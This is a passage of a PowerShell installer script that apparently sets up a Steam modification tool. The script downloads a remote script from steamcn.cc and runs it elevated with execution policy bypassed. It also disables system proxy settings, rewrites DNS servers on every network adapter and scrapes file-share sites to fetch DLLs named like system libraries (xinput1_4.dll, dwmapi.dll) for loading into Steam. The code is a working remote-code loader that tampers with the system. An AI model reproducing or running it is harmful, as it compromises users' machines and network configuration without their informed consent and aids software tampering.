$ErrorActionPreference = "Stop"
$ProgressPreference = "Continue"

try {
    $__host = [string]$Host.Name
    $__ise = ($__host -eq "Windows PowerShell ISE Host")
    $__dirty = ($env:CSU_RIVAL_DIRTY -eq "1")
    $__isAdmin = $false
    try {
        $__wi = [Security.Principal.WindowsIdentity]::GetCurrent()
        $__isAdmin = (New-Object Security.Principal.WindowsPrincipal($__wi)).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {}
    $__aliasHit = $false
    try {
        $alIrm = Get-Alias -Name irm -ErrorAction SilentlyContinue
        if ($alIrm -and [string]$alIrm.Definition -ne "Invoke-RestMethod") { $__aliasHit = $true }
        $alIwr = Get-Alias -Name iwr -ErrorAction SilentlyContinue
        if ($alIwr -and [string]$alIwr.Definition -ne "Invoke-WebRequest") { $__aliasHit = $true }
        foreach ($cn in @("Invoke-WebRequest", "Invoke-RestMethod", "Start-Process")) {
            $c0 = Get-Command $cn -ErrorAction SilentlyContinue
            if ($c0 -and $c0.CommandType -ne [System.Management.Automation.CommandTypes]::Cmdlet) { $__aliasHit = $true }
        }
    } catch {}
    $__proxyHit = $false
    try {
        $__wp = [System.Net.WebRequest]::DefaultWebProxy
        if ($__wp) {
            $__pu = $__wp.GetProxy([Uri]"https://steamcn.cc/")
            if ($__pu -and $__pu.IsAbsoluteUri -and ($__pu.Host -notmatch '(?i)steamcn\.cc$')) { $__proxyHit = $true }
        }
    } catch {}
    $__needElev = (-not $__isAdmin)
    $__needClean = ($__ise -or $__dirty -or $__aliasHit -or $__proxyHit)
    $__depth = 0
    try { if ($env:CSU_REENTER_DEPTH) { $__depth = [int]$env:CSU_REENTER_DEPTH } } catch { $__depth = 0 }
    if (($__needElev -or $__needClean) -and $__depth -lt 2) {
        $env:CSU_REENTER_DEPTH = [string]($__depth + 1)
        $env:CSU_CLEAN_PS = "1"
        $tmpRaw = Join-Path $env:TEMP ("csu_install_" + [guid]::NewGuid().ToString("N") + ".raw")
        $tmpPs1 = [System.IO.Path]::ChangeExtension($tmpRaw, ".ps1")
        $srcUrl = "https://steamcn.cc/download/install_remote.ps1"
        $ok = $false
        try {
            $curl = Get-Command "curl.exe" -ErrorAction SilentlyContinue
            if ($curl) {
                & curl.exe --ssl-no-revoke -sL --max-time 60 -o $tmpRaw -- $srcUrl
                if (($LASTEXITCODE -eq 0) -and (Test-Path $tmpRaw) -and ((Get-Item $tmpRaw).Length -gt 1000)) { $ok = $true }
            }
            if (-not $ok) {
                $cmd = Get-Command Invoke-WebRequest -CommandType Cmdlet -ErrorAction SilentlyContinue
                if ($cmd) {
                    & $cmd -Uri $srcUrl -OutFile $tmpRaw -UseBasicParsing -TimeoutSec 60
                    if ((Test-Path $tmpRaw) -and ((Get-Item $tmpRaw).Length -gt 1000)) { $ok = $true }
                }
            }
            if ($ok) {
                $bytes = [System.IO.File]::ReadAllBytes($tmpRaw)
                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
                if ($text -notmatch 'SDL3_voder\.dll') { $ok = $false }
                if ($ok) {
                    [System.IO.File]::WriteAllText($tmpPs1, $text, (New-Object System.Text.UTF8Encoding($true)))
                }
            }
        } catch { $ok = $false }
        Remove-Item -LiteralPath $tmpRaw -Force -ErrorAction SilentlyContinue
        if ($ok) {
            if ($__isAdmin) {
                & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpPs1
            } else {
                $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$tmpPs1`""
                try {
                    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList $arg -Wait
                } catch {
                    Start-Process -FilePath "powershell.exe" -ArgumentList $arg -Wait
                }
            }
            Remove-Item -LiteralPath $tmpPs1 -Force -ErrorAction SilentlyContinue
            [Environment]::Exit(0)
        }
        if ($__needClean) {
            Write-Host "error dirty session" -ForegroundColor Red
            Write-Host "[请关闭此窗口，新开管理员 PowerShell 再跑官方装机命令]" -ForegroundColor Yellow
            [Environment]::Exit(0)
        }
    }
} catch {}

try {
    [System.Net.WebRequest]::DefaultWebProxy = $null
    $env:HTTP_PROXY = $null; $env:HTTPS_PROXY = $null; $env:ALL_PROXY = $null
    $env:http_proxy = $null; $env:https_proxy = $null; $env:all_proxy = $null
    $env:NO_PROXY = $null; $env:no_proxy = $null
} catch {}
try {
    $ieProxy = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
    if (Test-Path $ieProxy) {
        Set-ItemProperty -Path $ieProxy -Name ProxyEnable -Value 0 -Force -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $ieProxy -Name ProxyServer -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $ieProxy -Name AutoConfigURL -ErrorAction SilentlyContinue
    }
} catch {}
try { & netsh.exe winhttp reset proxy 2>$null | Out-Null } catch {}
try {
    Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=TRUE" -ErrorAction SilentlyContinue | ForEach-Object {
        try { $_.SetDNSServerSearchOrder(@("223.5.5.5", "1.1.1.1")) | Out-Null } catch {}
    }
} catch {}
try { & ipconfig.exe /flushdns 2>$null | Out-Null } catch {}

try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072 } catch {}
try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 12288 } catch {}

$SigBaseUrl = "https://steamcn.cc/download"
$TmpDir  = "$env:TEMP\sdl3_setup"
$dlls    = @("SDL3_voder.dll", "xinput1_4.dll", "dwmapi.dll")
$dllAlias = @{
    "SDL3_voder.dll" = "voder"
    "xinput1_4.dll"  = "xinput"
    "dwmapi.dll"     = "dwmapi"
}
$LanzouShares = @{
    "voder" = @{ url = "https://wwaom.lanzn.com/i1lvc48c2lsb"; pwd = "5c04" }
    "xinput" = @{ url = "https://wwaom.lanzn.com/ijzg348c2lyh"; pwd = "7z0j" }
    "dwmapi" = @{ url = "https://wwaom.lanzn.com/i67Mb48c2lve"; pwd = "5inb" }
}
$WenshushuShares = @{
    "bundle" = @{ url = "https://c.wss.ink/f/kv9vp0pb70t"; pwd = "" }
}

$LanzouDllMaxAttempts = 3
$LanzouDllRetryMs = 1500
$LanzouTomlShares = @{
    "ipc/steamclient" = @{ url = "https://wwaom.lanzn.com/iZcvN42iu50f"; pwd = "csu7"; inner = "ipc_steamclient.toml" }
    "pattern/steamclient" = @{ url = "https://wwaom.lanzn.com/iLvs942iu57c"; pwd = "csu7"; inner = "pattern_steamclient.toml" }
    "pattern/steamui" = @{ url = "https://wwaom.lanzn.com/iLdxF42iu5bg"; pwd = "csu7"; inner = "pattern_steamui.toml" }
}
$LanzouUaDesktop = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
$LanzouUaMobile  = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
$LanzouUa = $LanzouUaDesktop
try { [Net.ServicePointManager]::Expect100Continue = $false } catch {}

function Write-Ok { Write-Host "OK" -ForegroundColor Green }
function Write-Err([string]$Msg) { Write-Host "error $Msg" -ForegroundColor Red }
function Show-SetupProgress([int]$Percent, [string]$Status = " ") {
    if ($Percent -lt 0) { $Percent = 0 }
    if ($Percent -gt 100) { $Percent = 100 }
    Write-Progress -Id 1 -Activity "正在网络初始化中..." -Status " " -PercentComplete $Percent
}
function Hide-SetupProgress {
    Write-Progress -Id 1 -Activity "正在网络初始化中..." -Completed
}

function Find-SteamPath {
    $regPaths = @(
        "HKCU:\Software\Valve\Steam",
        "HKLM:\SOFTWARE\Valve\Steam",
        "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam"
    )
    foreach ($rp in $regPaths) {
        if (Test-Path $rp) {
            $val = (Get-ItemProperty $rp -ErrorAction SilentlyContinue).InstallPath
            if (-not $val) { $val = (Get-ItemProperty $rp -ErrorAction SilentlyContinue).SteamPath }
            if ($val -and (Test-Path "$val\Steam.exe")) {
                return $val
            }
        }
    }
    $candidates = @(
        "C:\Program Files (x86)\Steam", "C:\Program Files\Steam",
        "D:\Program Files (x86)\Steam", "D:\Program Files\Steam", "D:\Steam",
        "E:\Program Files (x86)\Steam", "E:\Program Files\Steam", "E:\Steam",
        "F:\Program Files (x86)\Steam", "F:\Program Files\Steam", "F:\Steam"
    )
    foreach ($p in $candidates) {
        if (Test-Path "$p\Steam.exe") { return $p }
    }
    return $null
}

function Invoke-HttpText(
    [string]$Url,
    [string]$Method = "GET",
    [string]$Body = $null,
    [string]$ContentType = $null,
    [string]$Referer = $null,
    [string]$UserAgent = $null,
    [string]$Cookie = $null,
    [string]$XRequestedWith = $null,
    [hashtable]$ExtraHeaders = $null
) {
    if ([string]::IsNullOrWhiteSpace($UserAgent)) { $UserAgent = $LanzouUa }
    $curl = Get-Command "curl.exe" -ErrorAction SilentlyContinue
    if ($curl) {
        $args = @("--ssl-no-revoke", "-sL", "--max-time", "25", "-A", $UserAgent)
        if ($script:LanzouCookieFile) {
            $args += @("-c", $script:LanzouCookieFile, "-b", $script:LanzouCookieFile)
        }
        if ($Referer) { $args += @("-e", $Referer) }
        if ($Cookie) { $args += @("-H", "Cookie: $Cookie") }
        if ($XRequestedWith) { $args += @("-H", "X-Requested-With: $XRequestedWith") }
        if ($ExtraHeaders) {
            foreach ($hk in $ExtraHeaders.Keys) {
                $hn = [string]$hk
                if ($hn -match '^(?i)User-Agent$') { continue }
                $args += @("-H", ($hn + ": " + [string]$ExtraHeaders[$hk]))
            }
        }
        if ($Method -eq "POST") {
            $args += @("-X", "POST")
            if ($ContentType) { $args += @("-H", "Content-Type: $ContentType") }
            if ($null -ne $Body) { $args += @("--data-binary", $Body) }
        }
        $args += @("--", $Url)
        try {
            $out = & curl.exe @args 2>$null
            if ($LASTEXITCODE -eq 0 -and $null -ne $out) {
                if ($out -is [array]) { return ($out -join "`n") }
                return [string]$out
            }
        } catch {}
    }
    try {
        $req = [System.Net.HttpWebRequest]::Create($Url)
        $req.Method = $Method
        $req.Timeout = 20000
        $req.ReadWriteTimeout = 20000
        $req.AllowAutoRedirect = $true
        $req.UserAgent = $UserAgent
        $req.KeepAlive = $false
        if ($script:LanzouCookies) { $req.CookieContainer = $script:LanzouCookies }
        if ($Referer) { $req.Referer = $Referer }
        if ($Cookie) { $req.Headers.Add("Cookie", $Cookie) }
        if ($XRequestedWith) { $req.Headers.Add("X-Requested-With", $XRequestedWith) }
        if ($ExtraHeaders) {
            foreach ($hk in $ExtraHeaders.Keys) {
                $hn = [string]$hk
                if ($hn -match '^(?i)User-Agent$') { $req.UserAgent = [string]$ExtraHeaders[$hk]; continue }
                if ($hn -match '^(?i)Referer$') { $req.Referer = [string]$ExtraHeaders[$hk]; continue }
                try { $req.Headers.Add($hn, [string]$ExtraHeaders[$hk]) } catch {}
            }
        }
        if ($Method -eq "POST") {
            if (-not $ContentType) { $ContentType = "application/x-www-form-urlencoded" }
            $bytes = [Text.Encoding]::UTF8.GetBytes([string]$Body)
            $req.ContentType = $ContentType
            $req.ContentLength = $bytes.Length
            $rs = $req.GetRequestStream()
            try { $rs.Write($bytes, 0, $bytes.Length) } finally { $rs.Close() }
        }
        $resp = $req.GetResponse()
        try {
            $sr = New-Object System.IO.StreamReader($resp.GetResponseStream())
            try { return $sr.ReadToEnd() } finally { $sr.Close() }
        } finally { $resp.Close() }
    } catch { return $null }
}

function Get-RedirectLocation([string]$Url, [string]$Referer) {
    $curl = Get-Command "curl.exe" -ErrorAction SilentlyContinue
    if ($curl) {
        try {
            $headers = & curl.exe --ssl-no-revoke -sI --max-redirs 0 --max-time 20 -A $LanzouUaDesktop -e $Referer `
                -H "Cookie: down_ip=1" -- $Url 2>$null
            if ($headers -is [array]) { $headers = $headers -join "`n" }
            if ($headers -match '(?im)^Location:\s*(.+)$') {
                return $Matches[1].Trim()
            }
        } catch {}
    }
    try {
        $req = [System.Net.HttpWebRequest]::Create($Url)
        $req.Method = "GET"
        $req.AllowAutoRedirect = $false
        $req.UserAgent = $LanzouUaDesktop
        $req.Referer = $Referer
        $req.Timeout = 20000
        $req.Headers.Add("Cookie", "down_ip=1")
        $resp = $req.GetResponse()
        try {
            $loc = $resp.Headers["Location"]
            if ($loc) { return $loc }
        } finally { $resp.Close() }
    } catch [System.Net.WebException] {
        $wr = $_.Exception.Response
        if ($wr) {
            try {
                $loc = $wr.Headers["Location"]
                if ($loc) { return $loc }
            } finally { $wr.Close() }
        }
    } catch {}
    return $null
}

function Complete-LanzouMidUrl([string]$MidUrl) {
    if ([string]::IsNullOrWhiteSpace($MidUrl)) { return $null }
    $final = Get-RedirectLocation -Url $MidUrl -Referer "https://developer.lanzoug.com"
    if ($final -and $final -match '^https?://') {
        return ($final -replace 'pid=.*?&', '')
    }
    $body = Invoke-HttpText -Url $MidUrl -UserAgent $LanzouUaMobile `
        -Referer "https://developer.lanzoug.com" -Cookie "down_ip=1"
    if ($body -and $body -match '<a\s+href="(https?://[^"]+)"') {
        return $Matches[1]
    }
    if ($body -and $body -match "file':'([^']+)'" ) {
        $fileTok = $Matches[1]
        $vsign = $null
        if ($body -match "sign':'([^']+)'") { $vsign = $Matches[1] }
        if ($vsign) {
            try {
                $origin = ([uri]$MidUrl).GetLeftPart([UriPartial]::Authority)
                foreach ($el in @("2", "1", "3")) {
                    $post = "file=$([uri]::EscapeDataString($fileTok))&el=$el&sign=$([uri]::EscapeDataString($vsign))"
                    foreach ($path in @("/file/ajax.php", "/file/ajaxfile.php", "/file/ajaxm.php", "/ajaxfile.php")) {
                        $vr = Invoke-HttpText -Url ($origin + $path) -Method "POST" -Body $post `
                            -ContentType "application/x-www-form-urlencoded" -Referer $MidUrl `
                            -UserAgent $LanzouUaDesktop -Cookie "down_ip=1" -XRequestedWith "XMLHttpRequest"
                        if (-not $vr) { continue }
                        try { $vj = $vr | ConvertFrom-Json } catch { continue }
                        if ($vj -and $vj.url -and ([string]$vj.zt -eq '1' -or [int]$vj.zt -eq 1)) {
                            $u = [string]$vj.url
                            if ($u -notmatch '^https?://' -or $u -match 'SignError') { continue }
                            return $u
                        }
                    }
                }
            } catch {}
        }
    }
    return $null
}

function Get-LanzouJs([string]$Html) {
    if ([string]::IsNullOrWhiteSpace($Html)) { return "" }
    $parts = New-Object System.Collections.Generic.List[string]
    foreach ($m in [regex]::Matches($Html, '(?is)<script[^>]*>(.*?)</script>')) {
        $parts.Add($m.Groups[1].Value)
    }
    $js = if ($parts.Count -gt 0) { [string]::Join("`n", $parts.ToArray()) } else { $Html }
    $js = [regex]::Replace($js, '(?m)//.*$', '')
    $js = [regex]::Replace($js, '(?s)/\*.*?\*/', '')
    return $js
}

function Get-LanzouSign([string]$Html) {
    if ([string]::IsNullOrWhiteSpace($Html)) { return $null }
    $data = Get-LanzouJs $Html
    if ($data -match "(?<='sign':')\w+?(?=')") { return $Matches[0] }
    if ($data -match "(?<='sign':)[\w]+?(?=,)") {
        $var = $Matches[0]
        $best = $null
        foreach ($m in [regex]::Matches($data, [regex]::Escape($var) + " = '([^']*)'")) {
            $s = $m.Groups[1].Value
            if ($s.Length -ge 20 -and ((-not $best) -or $s.Length -gt $best.Length)) { $best = $s }
        }
        if ($best) { return $best }
    }
    $best = $null
    foreach ($m in [regex]::Matches($data, "(?<=')[^']+_c")) {
        $s = $m.Value
        if ((-not $best) -or $s.Length -lt $best.Length) { $best = $s }
    }
    if ($best) { return $best }
    foreach ($m in [regex]::Matches($data, "(?<=')[\w]{50,}(?=')")) {
        $s = $m.Value
        if ((-not $best) -or $s.Length -gt $best.Length) { $best = $s }
    }
    return $best
}

function Resolve-LanzouDirectUrl([string]$ShareUrl, [string]$Pwd = "") {
    if ([string]::IsNullOrWhiteSpace($ShareUrl)) { return $null }
    $parts = $ShareUrl -split '\.com/', 2
    $id = if ($parts.Count -ge 2) { $parts[1].Trim().TrimStart('/') } else { $ShareUrl.Trim().TrimStart('/') }
    if (-not $id) { return $null }
    if ($id -match '[?#]') { $id = ($id -split '[?#]', 2)[0] }

    $script:LanzouCookieFile = Join-Path $env:TEMP ("csu_lz_" + [guid]::NewGuid().ToString("N") + ".txt")
    $script:LanzouCookies = New-Object System.Net.CookieContainer
    try {
        foreach ($lzHost in @("https://www.lanzouf.com", "https://www.lanzoux.com", "https://www.lanzoup.com")) {
            $pageUrl = "$lzHost/$id"
            $html = Invoke-HttpText -Url $pageUrl -UserAgent $LanzouUaDesktop -Referer "$lzHost/"
            if ([string]::IsNullOrWhiteSpace($html) -or $html.Length -lt 200) { continue }
            if ($html -match '文件取消分享') { return $null }

            if ($html -notmatch "document\.getElementById\('pwd'\)" -and $html -match '<iframe[^>]+src="(/[^"]+)"') {
                $ifr = Invoke-HttpText -Url ($lzHost + $Matches[1]) -Referer $pageUrl -UserAgent $LanzouUaDesktop
                if (-not [string]::IsNullOrWhiteSpace($ifr)) { $html = $ifr }
            }
            if ([string]::IsNullOrWhiteSpace($Pwd) -and ($html -match "document\.getElementById\('pwd'\)")) { return $null }

            $js = Get-LanzouJs $html
            $fileid = $null
            if ($js -match '(?<=file=)\d+') { $fileid = $Matches[0] }
            if (-not $fileid -and $html -match '(?<=file=)\d+') { $fileid = $Matches[0] }
            $sign = Get-LanzouSign $html
            if (-not $fileid -or -not $sign) { continue }

            $websign = ""
            if ($js -match "(?<=')[0-9](?=')") { $websign = $Matches[0] }
            $websignkey = ""
            $km = [regex]::Match($js, "(?<=')(?!=|post|sign|json)[A-Za-z0-9]{4}(?=')")
            if ($km.Success) { $websignkey = $km.Value }

            $postPhp = "action=downprocess&sign=$([uri]::EscapeDataString($sign))&p=$([uri]::EscapeDataString($Pwd))" +
                "&websign=$([uri]::EscapeDataString($websign))&websignkey=$([uri]::EscapeDataString($websignkey))"
            $postKd = "action=downprocess&sign=$([uri]::EscapeDataString($sign))&p=$([uri]::EscapeDataString($Pwd))&kd=1"
            $urls = @(
                "$lzHost/ajaxm.php?file=$fileid",
                "$lzHost/ajaxfile.php?file=$fileid"
            )
            foreach ($ajaxUrl in $urls) {
                foreach ($postBody in @($postPhp, $postKd)) {
                    $jsonText = Invoke-HttpText -Url $ajaxUrl -Method "POST" -Body $postBody `
                        -ContentType "application/x-www-form-urlencoded" -Referer $pageUrl `
                        -UserAgent $LanzouUaDesktop -Cookie "down_ip=1"
                    $head = ""
                    if ($jsonText) { $head = $jsonText.Substring(0, [Math]::Min(180, $jsonText.Length)) -replace '[\r\n]+', ' ' }
                    if (-not $jsonText) { continue }
                    try { $resp = $jsonText | ConvertFrom-Json } catch { continue }
                    if (-not $resp -or [int]$resp.zt -ne 1 -or -not $resp.url -or $resp.url -eq "0" -or -not $resp.dom) { continue }
                    $mid = ($resp.dom.ToString().TrimEnd('/')) + "/file/" + $resp.url.ToString().TrimStart('/')
                    $done = Complete-LanzouMidUrl -MidUrl $mid
                    if ($done) { return $done }
                }
            }
        }
        return $null
    } finally {
        try { if ($script:LanzouCookieFile -and (Test-Path $script:LanzouCookieFile)) { Remove-Item -Force $script:LanzouCookieFile -ErrorAction SilentlyContinue } } catch {}
        $script:LanzouCookieFile = $null
        $script:LanzouCookies = $null
    }
}

function Test-PeDllFile([string]$Path) {
    try {
        if (-not (Test-Path $Path)) { return $false }
        $len = [int64](Get-Item $Path).Length
        $bn = [IO.Path]::GetFileName($Path).ToLower()
        $minLen = 50000
        if ($bn -match 'version|dwmapi|xinput') { $minLen = 1024 }
        if ($len -lt $minLen) { return $false }
        $fs = [IO.File]::OpenRead($Path)
        try {
            $b0 = $fs.ReadByte(); $b1 = $fs.ReadByte()
            return ($b0 -eq 0x4D -and $b1 -eq 0x5A)
        } finally { $fs.Close() }
    } catch { return $false }
}

function Save-RemoteFile([string]$Url, [string]$OutFile, [switch]$AllowNonPe, [string]$UserAgent = "") {
    if ([string]::IsNullOrWhiteSpace($UserAgent)) { $UserAgent = "CaiActivator" }
    $part = "$OutFile.part"
    try { if (Test-Path $OutFile) { Remove-Item -Force $OutFile -ErrorAction SilentlyContinue } } catch {}

    $curl = Get-Command "curl.exe" -ErrorAction SilentlyContinue
    if ($curl -and ($Url -notmatch ';')) {
        $maxAttempts = 3
        for ($i = 1; $i -le $maxAttempts; $i++) {
            try {
                & curl.exe --ssl-no-revoke -fL -sS --connect-timeout 10 --max-time 45 --retry 0 `
                    -C - -A "$UserAgent" -o $part -- $Url
                if ($LASTEXITCODE -eq 0 -and (Test-Path $part) -and ((Get-Item $part).Length -gt 1024)) {
                    if (-not $AllowNonPe -and -not (Test-PeDllFile $part)) {
                        try { Remove-Item -Force $part -ErrorAction SilentlyContinue } catch {}
                        break
                    }
                    Move-Item -Force $part $OutFile
                    return $true
                }
                if ($LASTEXITCODE -eq 28 -or $LASTEXITCODE -eq 18) {
                    Start-Sleep -Seconds 1
                    continue
                }
                if ($LASTEXITCODE -eq 23) {
                    try { if (Test-Path $part) { Remove-Item -Force $part -ErrorAction SilentlyContinue } } catch {}
                    Start-Sleep -Seconds 1
                    continue
                }
            } catch {}
            break
        }
        try { if (Test-Path $part) { Remove-Item -Force $part -ErrorAction SilentlyContinue } } catch {}
    }

    try {
        $maxAttempts = 3
        for ($i = 1; $i -le $maxAttempts; $i++) {
            $existing = 0L
            if (Test-Path $part) { $existing = [int64](Get-Item $part).Length }
            $req = [System.Net.HttpWebRequest]::Create($Url)
            $req.Method = "GET"
            $req.UserAgent = $UserAgent
            $req.KeepAlive = $true
            $req.ProtocolVersion = [System.Net.HttpVersion]::Version11
            $req.Timeout = 45000
            $req.ReadWriteTimeout = 45000
            $req.AllowAutoRedirect = $true
            if ($existing -gt 0) {
                try { $req.AddRange($existing) } catch {}
            }
            $resp = $null
            try {
                $resp = $req.GetResponse()
            } catch [System.Net.WebException] {
                $wr = $_.Exception.Response
                if ($wr -and [int]$wr.StatusCode -eq 416) {
                    if ($existing -gt 1024 -and ($AllowNonPe -or (Test-PeDllFile $part))) {
                        Move-Item -Force $part $OutFile
                        return $true
                    }
                    try { Remove-Item -Force $part -ErrorAction SilentlyContinue } catch {}
                    $existing = 0L
                    continue
                }
                throw
            }
            try {
                $expected = 0L
                try {
                    $cl = [int64]$resp.ContentLength
                    if ($cl -gt 0) { $expected = $existing + $cl }
                } catch {}
                $stream = $resp.GetResponseStream()
                $fs = if ($existing -gt 0) {
                    [System.IO.File]::Open($part, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write)
                } else {
                    [System.IO.File]::Create($part)
                }
                try {
                    $buf = New-Object byte[] 65536
                    $total = $existing
                    $lastPct = -1
                    while (($n = $stream.Read($buf, 0, $buf.Length)) -gt 0) {
                        $fs.Write($buf, 0, $n)
                        $total += $n
                        if ($expected -gt 0) {
                            $pct = [int](($total * 100) / $expected)
                            if ($pct -ge $lastPct + 10) { $lastPct = $pct }
                        }
                    }
                    if ($total -le 1024) { throw "too-small" }
                } finally {
                    $fs.Dispose()
                    if ($stream) { $stream.Dispose() }
                }
            } finally {
                if ($resp) { $resp.Dispose() }
            }
            if ((Test-Path $part) -and ((Get-Item $part).Length -gt 1024)) {
                if ($expected -gt 0 -and ((Get-Item $part).Length -lt $expected)) {
                    Start-Sleep -Seconds 1
                    continue
                }
                if (-not $AllowNonPe -and -not (Test-PeDllFile $part)) {
                    try { Remove-Item -Force $part -ErrorAction SilentlyContinue } catch {}
                    throw "not-pe"
                }
                Move-Item -Force $part $OutFile
                return $true
            }
        }
    } catch {
        try { if (Test-Path $part) { Remove-Item -Force $part -ErrorAction SilentlyContinue } } catch {}
    }
    try { if (Test-Path $part) { Remove-Item -Force $part -ErrorAction SilentlyContinue } } catch {}
    return $false
}

function Get-WssSnap([object]$Obj) {
    $code = ""
    try { if ($null -ne $Obj) { $code = [string]$Obj.code } } catch {}
    $raw = [string]$script:WssLastRaw
    if ($raw.Length -gt 200) { $raw = $raw.Substring(0, 200) }
    $raw = $raw -replace '[\r\n]+', ' '
    $http = 0
    try { $http = [int]$script:WssLastHttp } catch {}
    return ("http=" + $http + " code=" + $code + " raw=" + $raw)
}

function Invoke-WssJson([string]$Url, [string]$Body, [hashtable]$Headers) {
    $script:WssLastRaw = ""
    $script:WssLastHttp = 0
    if (-not $script:WssCookies) {
        $script:WssCookies = New-Object System.Net.CookieContainer
    }
    $token = ""
    if ($Headers) {
        if ($Headers.ContainsKey("X-TOKEN")) { $token = [string]$Headers["X-TOKEN"] }
        elseif ($Headers.ContainsKey("X-Token")) { $token = [string]$Headers["X-Token"] }
    }
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
    try {
        $req = [System.Net.HttpWebRequest]::Create($Url)
        $req.Method = "POST"
        $req.Timeout = 30000
        $req.ReadWriteTimeout = 30000
        $req.AllowAutoRedirect = $true
        $req.UserAgent = $ua
        $req.KeepAlive = $true
        $req.CookieContainer = $script:WssCookies
        try { $req.AutomaticDecompression = [Net.DecompressionMethods]::GZip -bor [Net.DecompressionMethods]::Deflate } catch {}
        try { $req.Headers.Add("Origin", "https://www.wenshushu.cn") } catch {}
        $req.Referer = "https://www.wenshushu.cn/"
        try { $req.Headers.Add("Prod", "com.wenshushu.web.pc") } catch {}
        $req.Headers.Add("Accept-Language", "en-US, en;q=0.9")
        $req.Accept = "application/json, text/plain, */*"
        if (-not [string]::IsNullOrWhiteSpace($token)) { $req.Headers.Add("X-TOKEN", $token) }
        $bytes = [Text.Encoding]::UTF8.GetBytes([string]$Body)
        $req.ContentType = "application/json"
        $req.ContentLength = $bytes.Length
        $rs = $req.GetRequestStream()
        try { $rs.Write($bytes, 0, $bytes.Length) } finally { $rs.Close() }
        $resp = $req.GetResponse()
        try {
            try { $script:WssLastHttp = [int]$resp.StatusCode } catch {}
            $sr = New-Object System.IO.StreamReader($resp.GetResponseStream())
            try { $text = $sr.ReadToEnd() } finally { $sr.Close() }
        } finally { $resp.Close() }
        if ([string]::IsNullOrWhiteSpace($text)) { return $null }
        $script:WssLastRaw = [string]$text
        try { return ($text | ConvertFrom-Json) } catch { return $null }
    } catch {
        $ex = $_.Exception
        $wr = $null
        try {
            if ($ex -is [System.Net.WebException]) { $wr = $ex.Response }
            elseif ($ex.InnerException -is [System.Net.WebException]) { $wr = $ex.InnerException.Response }
        } catch {}
        try { if ($wr) { $script:WssLastHttp = [int]$wr.StatusCode } } catch {}
        if ($wr) {
            try {
                $sr = New-Object System.IO.StreamReader($wr.GetResponseStream())
                try { $script:WssLastRaw = [string]$sr.ReadToEnd() } finally { $sr.Close() }
            } catch {}
            try { $wr.Close() } catch {}
        }
        if ([string]::IsNullOrWhiteSpace($script:WssLastRaw)) {
            try { $script:WssLastRaw = [string]$ex.Message } catch {}
        }
        try { return ($script:WssLastRaw | ConvertFrom-Json) } catch { return $null }
    }
}

function New-WssJsonStr([string]$s) { return ([char]34 + [string]$s + [char]34) }
function New-WssJsonKV([string]$Key, [string]$Val) { return ((New-WssJsonStr $Key) + ':' + (New-WssJsonStr $Val)) }

function Resolve-WenshushuDirectUrl([string]$ShareUrl, [string]$Pwd = "") {
    if ([string]::IsNullOrWhiteSpace($ShareUrl)) { return $null }
    $tid = ($ShareUrl.Trim().TrimEnd('/') -split '/')[-1]
    if ($tid -match '[?#]') { $tid = ($tid -split '[?#]', 2)[0] }
    if ([string]::IsNullOrWhiteSpace($tid)) { return $null }
    try {
        $script:WssFailReason = "resolve-login"
        $token = ""
        for ($li = 1; $li -le 3; $li++) {
            $login = Invoke-WssJson -Url "https://www.wenshushu.cn/ap/login/anonymous" -Body '{}' -Headers @{}
            try { $token = [string]$login.data.token } catch { $token = "" }
            if (-not [string]::IsNullOrWhiteSpace($token)) { break }
            Start-Sleep -Milliseconds (400 * $li)
        }
        if ([string]::IsNullOrWhiteSpace($token)) {
            $code = ""
            try { $code = [string]$login.code } catch { $code = "" }
            $raw = [string]$script:WssLastRaw
            if ($raw.Length -gt 200) { $raw = $raw.Substring(0, 200) }
            $raw = $raw -replace '[\r\n]+', ' '
            $script:WssFailReason = "resolve-login code=" + $code + " " + $raw
            return $null
        }
        $hdr = @{ "X-TOKEN" = $token }
        if ($tid.Length -eq 16) {
            $tokBody = '{' + (New-WssJsonKV 'token' $tid) + '}'
            $tok = Invoke-WssJson -Url "https://www.wenshushu.cn/ap/task/token" -Body $tokBody -Headers $hdr
            $tid = [string]$tok.data.tid
            if ([string]::IsNullOrWhiteSpace($tid)) {
                $script:WssFailReason = "resolve-token " + (Get-WssSnap $tok)
                return $null
            }
        }
        $script:WssFailReason = "resolve-mgr"
        $pwdJson = [string]$Pwd
        $mgrBody = '{' + (New-WssJsonKV 'tid' $tid) + ',' + (New-WssJsonKV 'password' $pwdJson) + '}'
        $mgr = Invoke-WssJson -Url "https://www.wenshushu.cn/ap/task/mgrtask" -Body $mgrBody -Headers $hdr
        $bid = ""; $ufilePid = ""
        try { $bid = [string]$mgr.data.boxid } catch {}
        try { $ufilePid = [string]$mgr.data.ufileid } catch {}
        if (-not $bid -or -not $ufilePid) {
            $script:WssFailReason = "resolve-mgr " + (Get-WssSnap $mgr)
            return $null
        }
        $script:WssFailReason = "resolve-list"
        $q = [char]34
        $listBody = '{' + $q + 'start' + $q + ':0,' + $q + 'sort' + $q + ':{' + $q + 'name' + $q + ':' + $q + 'asc' + $q + '},' + $q + 'bid' + $q + ':' + $q + $bid + $q + ',' + $q + 'pid' + $q + ':' + $q + $ufilePid + $q + ',' + $q + 'type' + $q + ':1,' + $q + 'options' + $q + ':{' + $q + 'uploader' + $q + ':' + $q + 'true' + $q + '},' + $q + 'size' + $q + ':50}'
        $list = Invoke-WssJson -Url "https://www.wenshushu.cn/ap/ufile/list" -Body $listBody -Headers $hdr
